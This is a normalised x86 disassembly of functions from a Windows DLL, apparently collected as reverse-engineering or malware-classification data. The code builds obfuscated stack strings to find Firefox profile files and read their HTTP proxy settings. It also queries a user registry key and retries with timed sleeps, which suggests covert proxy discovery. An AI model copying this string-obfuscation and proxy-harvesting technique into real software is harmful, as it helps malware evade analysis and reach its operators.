mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
mov esi r--data
push esi
push 0x1
push 0x14
mov ebx r--data
push ebx
call [ eax ]
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10006650
test eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
je r-xdata
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x15
push ebx
call [ eax ]
push 0x2710
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x16
push ebx
call [ eax ]
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x17
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
call sub_10005837
mov [ ebp - 0x20 ] eax
push eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_100066f4
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10005185
push 0x2710
call [ Sleep@IAT ]
push [ ebp - 0x20 ]
push [ ebp - 0x20 ]
call sub_100049d3
pop ecx
mov [ ebp - 0xc ] 0x1
push 0x2710
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_1000411b
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x18
push ebx
call [ eax ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_1000411b
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x19
push ebx
call [ eax ]
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x20 ]
call sub_1000532f
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1a
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
and [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x18 ]
call sub_1000662d
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1b
push ebx
call [ eax ]
push [ ebp - 0x18 ]
call sub_100049d3
cmp [ ebp - 0x1c ] 0x0
pop ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10005185
push 0x2710
call [ Sleep@IAT ]
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x3
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_10006650
test eax eax
jne r-xdata
push [ ebp - 0x20 ]
call sub_100049d3
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x27
push ebx
call [ eax ]
push 0x1b7740
jmp r-xdata
push 0x14
call sub_10004992
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_100066f4
test eax eax
jne r-xdata
jmp r-xdata
call [ Sleep@IAT ]
jmp r-xdata
and [ ebp - 0xc ] 0x0
push [ ebp - 0x24 ]
mov ecx eax
push [ ebp - 0x1c ]
call sub_10007061
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
call sub_10006e33
test al al
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1c
push ebx
call [ eax ]
jmp r-xdata
push r--data
call sub_1000411b
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1d
push ebx
call [ eax ]
mov ecx [ ebp - 0xc ]
call sub_10007059
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp - 0x34 ]
call sub_1000532f
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1e
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
and [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x30 ]
call sub_1000662d
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1f
push ebx
call [ eax ]
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push r--data
call sub_1000411b
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x24
push ebx
call [ eax ]
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x20 ]
call sub_1000532f
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x25
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
push [ ebp - 0x18 ]
je r-xdata
push [ ebp - 0x30 ]
call sub_100049d3
push [ ebp - 0x34 ]
call sub_100049d3
pop ecx
pop ecx
push [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
push [ ebp - 0x18 ]
call sub_100070c7
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x20
push ebx
call [ eax ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call sub_10005c92
call sub_10006436
jmp r-xdata
push [ ebp - 0x18 ]
call sub_100049d3
pop ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_1000411b
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x21
push ebx
call [ eax ]
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x2c ]
call sub_1000532f
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x22
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
push [ ebp - 0x10 ]
je r-xdata
push [ ebp - 0x1c ]
call sub_100049d3
pop ecx
call sub_100070a4
push [ ebp - 0xc ]
call sub_100049b2
pop ecx
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x26
push ebx
call [ eax ]
push [ ebp - 0x18 ]
call sub_100049d3
push [ ebp - 0x34 ]
call sub_100049d3
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
call sub_10005c92
call sub_10006436
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x23
push ebx
call [ eax ]
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0x2c ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
add esp 0xc
sub_10006c65
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov cl [ eax + edx ]
cmp cl 0xd
je r-xdata
mov [ eax + edx ] 0x0
cmp cl 0xa
jne r-xdata
inc edx
cmp edx [ ebp + 0xc ]
jb r-xdata
sub_10006c8d
push ebp
mov ebp esp
sub esp 0x18
push esi
push 0x3d
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x8 ] esi
call sub_10004217
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
leave
retn 0x4
push ebx
push edi
mov [ eax ] 0x0
mov ecx [ esi ]
push 0x8
inc eax
push r--data
mov [ ebp - 0xc ] eax
call sub_1000411b
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0xa
push r--data
call sub_1000411b
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x6
push r--data
call sub_1000411b
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
call sub_10004392
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
call sub_100043a4
jmp r-xdata
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
push [ ebp - 0x18 ]
call sub_100049d3
add esp 0xc
pop edi
pop ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x6
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
call sub_1000442a
sub_10006e33
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
cmp eax [ esi + 0x10 ]
jae r-xdata
xor al al
mov edi [ GetLastError@IAT ]
mov ebx r--data
mov ecx [ esi ]
push 0x6
push r--data
call sub_1000411b
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x7
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x7
push r--data
call sub_1000411b
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x8
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x6
push r--data
call sub_1000411b
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x9
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x7
push r--data
call sub_1000411b
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xa
push ebx
call [ eax ]
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
inc eax
inc [ esi + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
push [ ebp - 0x10 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xb
push ebx
call [ eax ]
push 0x12
call sub_10004992
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
cmp eax [ esi + 0x10 ]
jb r-xdata
push [ ebp - 0xc ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
call sub_1000439f
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10004361
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
push [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
call sub_10004437
jmp r-xdata
push [ esi + 0x8 ]
call [ lstrlenA@IAT ]
push [ esi + 0x8 ]
add [ esi + 0xc ] eax
call [ lstrlenA@IAT ]
push [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
call sub_100049d3
push [ ebp - 0xc ]
call sub_100049d3
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
add esp 0x10
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edi [ lstrlenA@IAT ]
call edi
push [ esi + 0x8 ]
add [ esi + 0xc ] eax
call edi
push [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
call sub_100049d3
push [ ebp - 0xc ]
call sub_100049d3
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
add esp 0x10
mov al 0x1
jmp r-xdata
mov ecx esi
call sub_10006c8d
pop edi
pop esi
pop ebx
leave
retn
sub_10007061
push ebp
mov ebp esp
push esi
push 0xc
mov esi ecx
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e0c
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
mov eax [ ebp + 0xc ]
push eax
mov [ esi + 0x8 ] ecx
push ecx
mov ecx esi
mov [ esi + 0x10 ] eax
call sub_10006c65
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100070a4
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
pop edi
pop esi
retn
mov ecx edi
call sub_1000416b
push edi
call sub_100049b2
pop ecx
sub_100070c7
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov edi ecx
push [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
call sub_1000443c
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push r--data
push 0x1
push 0xc
mov ebx r--data
push ebx
call [ eax ]
push 0x401
call sub_100049a9
pop ecx
mov [ ebp + 0x8 ] eax
call esi
mov ecx [ edi + 0x4 ]
push eax
call sub_10005052
push eax
push r--data
push [ ebp + 0x8 ]
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
add esp 0x10
mov [ ebp + 0xc ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push r--data
push 0x1
push 0xd
push ebx
call [ eax ]
mov edi [ edi + 0x4 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov ecx edi
call sub_100046e7
push edi
call sub_100049b2
pop ecx
sub_10007176
push esi
mov esi ecx
mov eax [ esi ]
push 0x0
call [ eax + 0x10 ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x18 ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x14 ]
pop esi
retn
sub_10007194
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov esi 0x208
push esi
mov [ ebp - 0x18 ] ecx
call sub_100049a9
push esi
push [ ebp + 0x8 ]
mov edi eax
push edi
mov [ ebp - 0x14 ] edi
call sub_1000428b
add esp 0x10
push 0x70
pop eax
push 0x72
mov [ ebp - 0x34 ] ax
pop eax
push 0x65
mov [ ebp - 0x32 ] ax
pop eax
push 0x66
mov esi [ lstrcatW@IAT ]
mov [ ebp - 0x30 ] ax
pop eax
push 0x73
mov [ ebp - 0x2e ] ax
pop eax
push 0x2e
mov [ ebp - 0x2c ] ax
pop eax
push 0x6a
mov [ ebp - 0x2a ] ax
pop eax
push 0x73
mov [ ebp - 0x28 ] ax
pop eax
mov [ ebp - 0x26 ] ax
push r--data
xor eax eax
push edi
mov [ ebp - 0x24 ] ax
call esi
lea eax [ ebp - 0x34 ]
push eax
push edi
call esi
xor ebx ebx
push ebx
push ebx
push 0x3
push ebx
push 0x1
push 0x80000000
push edi
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
push esi
call [ GetFileSize@IAT ]
push eax
mov [ ebp + 0x8 ] eax
call sub_100049a9
pop ecx
push ebx
mov edi eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ebx
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x48 ]
push eax
push edi
mov [ ebp - 0x48 ] 0x7774656e
mov [ ebp - 0x44 ] 0x2e6b726f
mov [ ebp - 0x40 ] 0x786f7270
mov [ ebp - 0x3c ] 0x74682e79
mov [ ebp - 0x38 ] 0x7074
mov [ ebp - 0x36 ] bl
mov [ ebp - 0x60 ] 0x7774656e
mov [ ebp - 0x5c ] 0x2e6b726f
mov [ ebp - 0x58 ] 0x786f7270
mov [ ebp - 0x54 ] 0x74682e79
mov [ ebp - 0x50 ] 0x705f7074
mov [ ebp - 0x4c ] 0x74726f
call sub_10004235
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor al al
jmp r-xdata
push r--data
push eax
call sub_10004235
lea esi [ eax + 0x3 ]
push r--data
push esi
call sub_10004235
sub eax esi
mov [ ebp - 0x1c ] eax
inc eax
push eax
call sub_100049a9
push [ ebp - 0x1c ]
mov [ ebp + 0x8 ] eax
push esi
push eax
call sub_1000428b
lea eax [ ebp - 0x60 ]
push eax
push edi
call sub_10004235
add esp 0x28
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push r--data
push eax
call sub_10004235
lea esi [ eax + 0x2 ]
push r--data
push esi
call sub_10004235
mov edi eax
sub edi esi
lea eax [ edi + 0x1 ]
push eax
call sub_100049a9
push edi
push esi
push eax
mov [ ebp - 0xc ] eax
call sub_1000428b
push 0x104
call sub_100049a9
push [ ebp - 0xc ]
mov esi eax
push [ ebp + 0x8 ]
push r--data
push esi
call [ wsprintfA@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
add esp 0x34
push esi
call [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_100049d3
push [ ebp - 0xc ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push ebx
mov edi r--data
push edi
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x4 ]
call sub_100049a9
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push ebx
push ebx
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
call esi
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov esi r--data
push esi
push [ ebp - 0xc ]
call sub_10004235
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0xc ]
call sub_100049d3
pop ecx
mov al 0x1
push [ ebp - 0x4 ]
call sub_100049a9
mov edi [ lstrlenA@IAT ]
pop ecx
push esi
mov [ ebp - 0x10 ] eax
call edi
mov ecx [ ebp - 0x4 ]
sub ecx eax
push ecx
push esi
call edi
add eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_1000428b
push 0x4
call sub_10004992
add esp 0x10
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx eax
call sub_10003ce6
mov [ ebp - 0x14 ] eax
jmp r-xdata
push 0x3a
push esi
call sub_10004217
mov ebx eax
mov edi ebx
sub edi esi
lea eax [ edi + 0x1 ]
push eax
call sub_100049a9
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
sub esi ebx
add eax esi
push eax
call sub_100049a9
push edi
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x10 ]
call sub_1000428b
mov eax [ ebp + 0x8 ]
lea eax [ esi + eax - 0x1 ]
push eax
inc ebx
push ebx
push [ ebp - 0x1c ]
call sub_1000428b
push [ ebp - 0x14 ]
call sub_100049d3
mov esi [ ebp - 0x18 ]
mov eax [ esi ]
add esp 0x2c
push [ ebp - 0x10 ]
mov ecx esi
call [ eax + 0x14 ]
push [ ebp - 0x1c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
mov ecx edi
call sub_10003ce9
push edi
call sub_100049b2
pop ecx
lea eax [ ebp + 0x8 ]
push eax
push esi
mov [ ebp + 0x8 ] ebx
call edi
mov ecx [ ebp - 0x4 ]
mov edi [ ebp - 0x14 ]
sub ecx eax
push ecx
push [ ebp - 0x10 ]
mov ecx edi
call sub_10003d7a
mov esi eax
mov [ ebp - 0x14 ] esi
cmp edi ebx
je r-xdata
sub_100074e1
push ebp
mov ebp esp
sub esp 0x888
push ebx
push esi
push edi
xor eax eax
mov esi 0x206
push esi
mov [ ebp - 0x888 ] ax
xor edi edi
lea eax [ ebp - 0x886 ]
push edi
push eax
mov [ ebp - 0x68 ] ecx
call sub_100042df
xor eax eax
push esi
mov [ ebp - 0x270 ] ax
lea eax [ ebp - 0x26e ]
push edi
push eax
call sub_100042df
xor eax eax
push esi
mov [ ebp - 0x478 ] ax
lea eax [ ebp - 0x476 ]
push edi
push eax
call sub_100042df
xor eax eax
push esi
mov [ ebp - 0x680 ] ax
lea eax [ ebp - 0x67e ]
push edi
push eax
call sub_100042df
add esp 0x30
push edi
push 0x1a
lea eax [ ebp - 0x680 ]
push eax
push edi
call [ SHGetSpecialFolderPathW@IAT ]
mov eax [ rw-data ]
mov edi [ GetLastError@IAT ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3
mov ebx r--data
push ebx
call [ esi ]
push 0x5c
pop eax
push 0x4d
mov [ ebp - 0x60 ] ax
pop eax
push 0x6f
mov [ ebp - 0x5e ] ax
pop eax
push 0x7a
mov [ ebp - 0x5c ] ax
pop eax
push 0x69
mov [ ebp - 0x5a ] ax
pop eax
push 0x6c
mov [ ebp - 0x58 ] ax
pop eax
push 0x61
mov [ ebp - 0x56 ] ax
mov [ ebp - 0x54 ] ax
pop eax
push 0x5c
mov [ ebp - 0x52 ] ax
pop eax
push 0x46
mov [ ebp - 0x50 ] ax
pop eax
mov [ ebp - 0x4e ] ax
push 0x69
pop eax
push 0x72
mov [ ebp - 0x4c ] ax
pop eax
push 0x65
mov esi [ lstrcatW@IAT ]
mov [ ebp - 0x4a ] ax
pop eax
push 0x66
mov [ ebp - 0x48 ] ax
pop eax
push 0x6f
mov [ ebp - 0x46 ] ax
pop eax
mov [ ebp - 0x44 ] ax
push 0x78
pop eax
mov [ ebp - 0x42 ] ax
xor eax eax
mov [ ebp - 0x40 ] ax
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x680 ]
push eax
call esi
lea eax [ ebp - 0x680 ]
push eax
lea eax [ ebp - 0x888 ]
push eax
call esi
push 0x5c
pop eax
push 0x70
mov [ ebp - 0x3c ] ax
pop eax
push 0x72
mov [ ebp - 0x3a ] ax
pop eax
push 0x6f
mov [ ebp - 0x38 ] ax
pop eax
push 0x66
mov [ ebp - 0x36 ] ax
pop eax
push 0x69
mov [ ebp - 0x34 ] ax
pop eax
push 0x6c
mov [ ebp - 0x32 ] ax
pop eax
push 0x65
mov [ ebp - 0x30 ] ax
pop eax
push 0x73
mov [ ebp - 0x2e ] ax
pop eax
push 0x2e
mov [ ebp - 0x2c ] ax
pop eax
push 0x69
mov [ ebp - 0x2a ] ax
pop eax
push 0x6e
mov [ ebp - 0x28 ] ax
pop eax
mov [ ebp - 0x26 ] ax
push 0x69
pop eax
mov [ ebp - 0x24 ] ax
xor eax eax
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x888 ]
push eax
call esi
push 0x50
pop eax
mov [ ebp - 0x20 ] ax
push 0x72
pop eax
push 0x6f
mov [ ebp - 0x1e ] ax
pop eax
push 0x66
mov [ ebp - 0x1c ] ax
pop eax
push 0x69
mov [ ebp - 0x1a ] ax
pop eax
push 0x6c
mov [ ebp - 0x18 ] ax
pop eax
push 0x65
mov [ ebp - 0x16 ] ax
pop eax
push 0x30
mov [ ebp - 0x14 ] ax
pop eax
push 0x50
mov [ ebp - 0x12 ] ax
xor eax eax
mov [ ebp - 0x10 ] ax
pop eax
push 0x61
mov [ ebp - 0xc ] ax
pop eax
push 0x74
mov [ ebp - 0xa ] ax
pop eax
push 0x68
mov [ ebp - 0x8 ] ax
pop eax
mov [ ebp - 0x6 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x888 ]
push eax
push 0x104
lea eax [ ebp - 0x270 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ GetPrivateProfileStringW@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x64 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x64 ]
push r--data
push 0x1
push 0x4
push ebx
call [ eax ]
mov edi [ lstrlenW@IAT ]
lea eax [ ebp - 0x270 ]
push eax
xor ebx ebx
call edi
test eax eax
jle r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x478 ]
push eax
call esi
lea eax [ ebp - 0x270 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call esi
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x478 ]
push eax
call sub_10007194
pop edi
test al al
pop esi
setne al
pop ebx
leave
retn
cmp [ ebp + ebx * 2 - 0x270 ] 0x2f
je r-xdata
push 0x5c
pop eax
mov [ ebp + ebx * 2 - 0x270 ] ax
lea eax [ ebp - 0x270 ]
push eax
inc ebx
call edi
cmp ebx eax
jl r-xdata
jmp r-xdata
sub_10007826
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push 0x4
push esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov [ esi ] rw-data
xor eax eax
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
pop esi
pop ebp
retn 0xc
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_100042b0
